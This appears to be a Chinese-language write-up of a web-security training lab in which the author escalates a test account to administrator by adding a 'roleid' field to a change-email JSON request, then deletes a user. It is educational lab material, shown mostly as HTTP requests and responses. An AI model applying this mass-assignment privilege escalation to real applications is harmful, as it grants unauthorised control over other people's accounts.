# 实验：可在用户配置文件中修改的用户角色

本实验在 `/admin` 处有一个管理员面板。它仅对 `roleid` 为 2 的已登录用户可访问。

通过访问管理员面板并使用它删除用户 `carlos` 来解决本实验。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 探测管理员端点
    ```http
    GET /admin HTTP/2
    ```
    - 服务器响应
        ```http
        HTTP/2 401 Unauthorized

        Admin interface only available if logged in as an administrator
        ```
    
    - 发现管理员端点，但拥有访问控制

- 查看邮件修改功能
    ```html
    <script src='/resources/js/changeEmail.js'>
    ```
    - 获取表单并转为 JSON 格式发送


- 使用邮件修改功能
    ```http
    POST /my-account/change-email HTTP/2

    {
        "email":"a@b"
    }
    ```

    - 服务器响应
        ```json
        {
            "username":"wiener",
            "email":"a@b",
            "apikey":"O4lzHxfHIc6lgkICjsRkFrcwFIOAHw6n",
            "roleid":1
        }
        ```
        - 返回的 json 中 `roleid` 字段或控制权限

- 尝试在 GET 参数与 Cookie 中添加 `roleid`
    - 均无效

- 尝试在修改邮件功能中添加 `roleid` 字段以设置对象属性
    ```http
    POST /my-account/change-email HTTP/2

    {
        "email":"a@b",
        "roleid":2
    }
    ```
    - 服务器响应
        ```json
        {
            "username":"wiener",
            "email":"a@b",
            "apikey":"O4lzHxfHIc6lgkICjsRkFrcwFIOAHw6n",
            "roleid":2
        }
        ```
        - 成功修改服务器端状态

- 在修改 `roleid` 属性成功后，访问管理员端点
    - 成功。使用删除功能
